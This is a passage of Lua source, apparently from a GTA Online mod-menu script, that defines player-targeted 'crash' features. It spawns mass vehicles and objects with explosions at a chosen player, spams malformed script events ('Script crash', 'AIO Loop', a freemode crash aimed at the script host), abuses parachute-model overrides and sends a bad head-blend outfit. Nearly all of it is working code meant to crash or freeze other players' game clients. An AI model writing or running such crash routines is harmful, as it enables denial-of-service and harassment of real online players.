    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance1)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes1, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes1)
    spawnedPlanes1 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrashing, 'Select your loop', {}, "", vehicleType1, 1, function (opt)
    selected1 = opt
end)

menu.slider(craftcrashing, "Loop Distance", {}, "", 0, 500, spawnDistance1, 25, function(distance)
    spawnDistance1 = distance
end)


local spawnDistance2 = 0
local vehicleType2 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected2 = 1
local spawnedPlanes2 = {}

menu.toggle_loop(craftcrashing, "Start Loop 2", {"craftloop2"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType2[selected2])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance2)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes2, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes2)
    spawnedPlanes2 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrashing, 'Select your loop', {}, "", vehicleType2, 1, function (opt)
    selected2 = opt
end)

menu.slider(craftcrashing, "Loop Distance", {}, "", 0, 500, spawnDistance2, 25, function(distance)
    spawnDistance2 = distance
end)

local spawnDistance3 = 0
local vehicleType3 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected3 = 1
local spawnedPlanes3 = {}

menu.toggle_loop(craftcrashing, "Start Loop 3", {"craftloop3"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType3[selected3])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance3)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes3, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes3)
    spawnedPlanes3 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrashing, 'Select your loop', {}, "", vehicleType3, 1, function (opt)
    selected3 = opt
end)

menu.slider(craftcrashing, "Loop Distance", {}, "", 0, 500, spawnDistance3, 25, function(distance)
    spawnDistance3 = distance
end)

local spawnDistance4 = 0
local vehicleType4 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected4 = 1
local spawnedPlanes4 = {}

menu.toggle_loop(craftcrashing, "Start Loop 4", {"craftloop4"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType4[selected4])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance4)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes4, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes4)
    spawnedPlanes4 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrashing, 'Select your loop', {}, "", vehicleType4, 1, function (opt)
    selected4 = opt
end)

menu.slider(craftcrashing, "Loop Distance", {}, "", 0, 500, spawnDistance4, 25, function(distance)
    spawnDistance4 = distance
end)

local spawnDistance5 = 0
local vehicleType5 = { 'hydra', 'cargoplane', 'alkonost', 'lazer', "freight", "freightcar", 'blista', 'issi8', 'virtue', 'towtruck', 'towtruck2', 'bombushka', 'volatol', 'kosatka', 'seabreeze', 'tula', 'avenger2',
 'armytrailer2', 'buzzard', 'savage', 'seasparrow', 'frogger2', 'bulldozer', 'flatbed',
 'proptrailer', 'tr4', 'tug', 'cargobob', 'cargobob2', 'luxor2'}

local selected5 = 1
local spawnedPlanes5 = {}

menu.toggle_loop(craftcrashing, "Start Loop 5", {"craftloop5"}, "Hold down enter...", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType5[selected5])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Incoming Vehicles o.o")
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance5)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes5, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes5)
    spawnedPlanes5 = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
end)

menu.list_select(craftcrashing, 'Select your loop', {}, "", vehicleType5, 1, function (opt)
    selected5 = opt
end)

menu.slider(craftcrashing, "Loop Distance", {}, "", 0, 500, spawnDistance5, 25, function(distance)
    spawnDistance5 = distance
end)

local objectc = menu.list(Removals_List, "Object Crash", {"objectcrashes"}, "")

local amount = 5000
local delay = 100
menu.slider(objectc, "Spawn Amount", {"spawnammount"}, "", 0, 5000, amount, 50, function(val)
    amount = val
end)

menu.slider(objectc, "Spawn Delay", {"spawndelay"}, "", 0, 500, delay, 10, function(val)
    delay = val
end)

menu.list_select(objectc, "Object Model", {"objectmodel"}, "", object_names, 1, function(val)
    selectedobject = all_objects[val]
end)

menu.toggle_loop(objectc, "Send Objects", {"sendobjects"}, "", function()
    
    local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
    local myped = PLAYER.PLAYER_PED_ID()
    local mypos = ENTITY.GET_ENTITY_COORDS(myped, true)
    local objects = {}
    for i = 1, amount do
        if not players.exists(pid) then
            break
        end
        ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
        ppos.x = ppos.x + math.random(-1, 1)
        ppos.y = ppos.y + math.random(-1, 1)
        objects[#objects+1] = CreateObject(selectedobject, ppos)
        FIRE.ADD_EXPLOSION(ppos.x, ppos.y, ppos.z, 0, 1.0, false, true, 0.0, false)
        util.yield(delay)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(selectedobject)
    if players.exists(pid) then
        util.yield(2500)
    end
    ClearEntities(objects)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, false, false)
    util.yield(50)
    local allobjs = entities.get_all_objects_as_handles()
    for i, object in ipairs(allobjs) do
        if ENTITY.GET_ENTITY_MODEL(object) == 3026082634 or ENTITY.GET_ENTITY_MODEL(object) == selectedobject then
            entities.delete_by_handle(object)
        end
    end
    util.yield(50)
    
    util.toast("[Object Crash] Finished.")
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


local spawnDistance = 0
local vehicleType = { 'cargoplane', 'hydra', 'jetbombushka', 'bombushka', 'volatol', 'luxor2', 'seabreeze', 'tula', 'avenger2' }
local selected = 1
local antichashCam <const> = menu.ref_by_path("Game>Camera>Anti-Crash Camera", 38)
local spawnedPlanes = {}

local nukecrash = menu.list(Removals_List, "Nuke Crashes", {}, "")
    
menu.slider(nukecrash, "Nuke Distance", {}, "", 0, 500, spawnDistance, 25, function(distance)
    spawnDistance = distance
end)

menu.list_select(nukecrash, 'Nuke Mode', {}, "", vehicleType, 1, function (opt)
    selected = opt
    -- print('Opt: '..opt..' | vehicleType: '..vehicleType[selected])
end)

menu.toggle_loop(nukecrash, "Nuke player", {}, "", function (on_toggle)
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType[selected])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Crash | Nuker started.")
    while util.current_time_millis() - startTime < 20000 do
        local pos = GetCoordsInFrontOfEntity(playerPed, spawnDistance)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end

    ClearEntities(spawnedPlanes)
    spawnedPlanes = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
    util.toast("Crash | Nuker finished.")
end)

menu.toggle_loop(nukecrash, "Nuke Explosions", {}, "Nuke the player", function() --anonym nuke
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, 0, 0)
    local defx = 0
    local defy = 0
    local defz = 0
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defz = defz + 2
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defz = defz + 2
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defz = defz + 2
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defz = defz + 2
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defz = defz + 2
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
    util.yield(50)
    defx = defx + 2
    defy = defy + 2
    c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, defx, defy, defz)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 1.0, false)
end)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

menu.toggle_loop(Removals_List,"Funny Spam Loop", {""} ,"" , function()
    util.trigger_script_event(1 << pid, {1240068495,pid, math.random(1240068495,1240068495)})
    util.trigger_script_event(1 << pid, {1915499503,pid, math.random(1915499503,1915499503)})
    util.trigger_script_event(1 << pid, {-1425016400,pid, math.random(-1425016400,-1425016400)})
    util.trigger_script_event(1 << pid, {-1529596656,pid, math.random(-1529596656,-1529596656)})
    util.trigger_script_event(1 << pid, {-283041276,pid, math.random(-283041276,-283041276)})
    util.trigger_script_event(1 << pid, {-1838276770,pid, math.random(-1838276770,-1838276770)})
    util.trigger_script_event(1 << pid, {-1973627888,pid, math.random(-1973627888,-1973627888)})
    util.trigger_script_event(1 << pid, {-1388926377,pid, math.random(-1388926377,-1388926377)})
    util.trigger_script_event(1 << pid, {2131601101,pid, math.random(2131601101,2131601101)})
    util.trigger_script_event(1 << pid, {1361475530,pid, math.random(1361475530,1361475530)})
    util.trigger_script_event(1 << pid, {1111927333,pid, math.random(1111927333,1111927333)})
    util.trigger_script_event(1 << pid, {-1390976345,pid, math.random(-1390976345,-1390976345)})           --frezze--
    util.trigger_script_event(1 << pid, {-768108950,pid, math.random(-768108950,-768108950)}) 
    util.trigger_script_event(1 << pid, {-714268990,pid, math.random(-714268990,-714268990)})
    util.trigger_script_event(1 << pid, {1214823473,pid, math.random(1214823473,1214823473)})
    util.trigger_script_event(1 << pid, {2095232746,pid, math.random(2095232746,2095232746)})
    util.trigger_script_event(1 << pid, {-1973627888,pid, math.random(-1973627888,-1973627888)})
    util.trigger_script_event(1 << pid, {-555356783, pid, math.random(1, 32), 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
end)



menu.toggle_loop(Removals_List, "Player Parachute Crash", {}, "", function()
    local ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local hashes = {util.joaat("prop_beach_parasol_02"), util.joaat("prop_parasol_04c")}
    for i = 1, #hashes do
        RqModel(hashes[i])
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(pid, hashes[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped, 0xFBAB5776, 1000, false)
        util.yield(200)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(ped)
        end
        util.yield(1200)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z, false, true, true)
end)

menu.toggle_loop(Removals_List, "Ruiner Parachute Crash", {}, "", function ()
    local ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    RqModel(util.joaat("Ruiner2"))
    local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), pos, 0, true)
    PED.SET_PED_INTO_VEHICLE(ped, Ruiner2, -1)
    local hashes = {util.joaat("prop_beach_parasol_05"), util.joaat("prop_parasol_02")}
    for i = 1, #hashes do
        RqModel(hashes[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, 0, 0, 500, false, true, true)
        util.yield(200)
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, hashes[i])
        VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, true)
        util.yield(1200)
    end
    entities.delete_by_handle(Ruiner2)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z, false, true, true)
end)


menu.toggle_loop(Removals_List, "Indirect Freemode Crash", {}, "Midnight Destroy SH", function()
    util.trigger_script_event(players.get_script_host() , {1368055548,players.get_script_host(), 0, 1, 0})
end)

menu.toggle_loop(Removals_List, "Ghost crash", {}, "", function ()
    menu.trigger_commands("otr")
    menu.trigger_commands("invisibility on")
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local sentinel = util.joaat("tr2")
    STREAMING.REQUEST_MODEL(sentinel)
    while not STREAMING.HAS_MODEL_LOADED(sentinel) do
        util.yield()
    end
    local vehicle1 = entities.create_vehicle(sentinel, pos, 0)
    local sentinels = util.joaat("tr2")
    STREAMING.REQUEST_MODEL(sentinels)
    while not STREAMING.HAS_MODEL_LOADED(sentinels) do
        util.yield()
    end
    local vehicle2 = entities.create_vehicle(sentinels, pos, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle1, vehicle2, 0, 0, 0, -10, 0, 0, 0, true, true, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 0, -10, 0, 0, 0, true, true, false, true, false, 0, true)
    playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for i = 0, 10 do
    playerpos = ENTITY.GET_ENTITY_COORDS(playerped, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), playerpos.x, playerpos.y, playerpos.z, false, false, false)
    for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)
        menu.trigger_commands("otr")
        menu.trigger_commands("invisibility off")
        end
    end
end)

menu.toggle_loop(Removals_List,"AIO Loop", {""} ,"" , function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local allvehicles = entities.get_all_vehicles_as_handles()
    for i = 1, 3 do
        for i = 1, #allvehicles do
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
            util.yield()
        end
     end
    util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
    util.trigger_script_event(1 << pid,{-555356783,pid, 0, 2, 18969111})
    util.trigger_script_event(1 << pid,{-1390976345,pid, 0, 2, 18969111})
    util.trigger_script_event(1 << pid,{-637352381,pid, 0, 2, 18969111})
    util.trigger_script_event(1 << pid,{-1529596656,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
    util.trigger_script_event(1 << pid,{-1991423686,pid, 0, 2, 18969111})
    util.trigger_script_event(1 << pid,{1992522613,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
    util.trigger_script_event(1 << pid,{-714268990,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
    util.trigger_script_event(1 << pid,{495813132,pid, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 1754244778, 10, 23135423, 11, 827870001, 12, 23135423})
    util.trigger_script_event(1 << pid,{-1247985006,pid, 0, 2, 1, 3, 1, 4, 1841685865, 5, 136236, 6, 27769, 7, -1450989833, 8, -2082595, 9, 1587193, 10, -6701543, 11, 147649, 12, 651264, 13, -2507024, 14, 11951923, 15, -833146974, 16, -1799182, 17, 2359273, 18, 4959292, 19, 1})
    util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17898883})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 17398799})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15576064})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -13128205})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -10321649})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9846577})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 21062401})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -5065659})
    util.trigger_script_event(1 << pid,{1348481963,pid,  0, 2, 378775})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9497036})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 8067058})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -3322411})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17851944})
    util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -18386240})
    util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
    util.trigger_script_event(1 << pid,{-668341698,pid, 0, 2, -668341698})
    util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
    util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
end)

menu.toggle_loop(Removals_List,"Script crash", {""} ,"" , function()
    util.trigger_script_event(1 << pid,{526822748,pid, 526822748})
    util.trigger_script_event(1 << pid,{-555356783,pid, -555356783})
    util.trigger_script_event(1 << pid,{495813132,pid, 495813132})
    util.trigger_script_event(1 << pid,{1992522613,pid, 1992522613})
    util.trigger_script_event(1 << pid,{1214823473,pid, 1214823473})
    util.trigger_script_event(1 << pid,{-634789188,pid, -634789188})
    util.trigger_script_event(1 << pid,{-668341698,pid, -668341698})
    util.trigger_script_event(1 << pid,{-1388926377,pid, -1388926377})
    util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
    util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
end)

menu.toggle_loop(Removals_List,"Razorable Crash", {""} ,"" , function()
    BadNetVehicleCrash(pid)
    util.yield(1000)
end)

menu.toggle_loop(Removals_List,"Orange 4G", {""} ,"" , function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local allvehicles = entities.get_all_vehicles_as_handles()
    for i = 1, 3 do
        for i = 1, #allvehicles do
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
            util.yield()
        end
    end
end)


menu.toggle_loop(Removals_List, "Bad Head Blend", {"outfitcrash"}, "", function()
    BlockSyncs(pid, function()
    local pos = v3.new(ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local usr = players.user()
------------------------------------------------------------------------------------------------------------
    local mdl = util.joaat("mp_m_freemode_01")
    STREAMING.REQUEST_MODEL(mdl)
        util.yield()
        local old_ped = players.user_ped()
        local new_ped = entities.create_ped(2, mdl, pos, 0)
        --PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 0, 39, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 1, 75, 19, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 2, 37, 11, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 3, 85, 3, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 4, 104, 31, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 5, 34, 29, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 6, 5, 27, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 7, 106, 3, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 8, 44, 7, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 9, 44, 7, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 10, 32, 23, 0)
        PED.SET_PED_COMPONENT_VARIATION(new_ped, 11, 7, 29, 0)
        util.yield(200)
        NETWORK.SET_ENTITY_LOCALLY_INVISIBLE(new_ped)
        util.yield()
        PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
        entities.delete_by_handle(new_ped)
        v3.free(pos)
------------------------------------------------------------------------------------------------------------
local mdl = util.joaat("s_m_y_blackops_03")
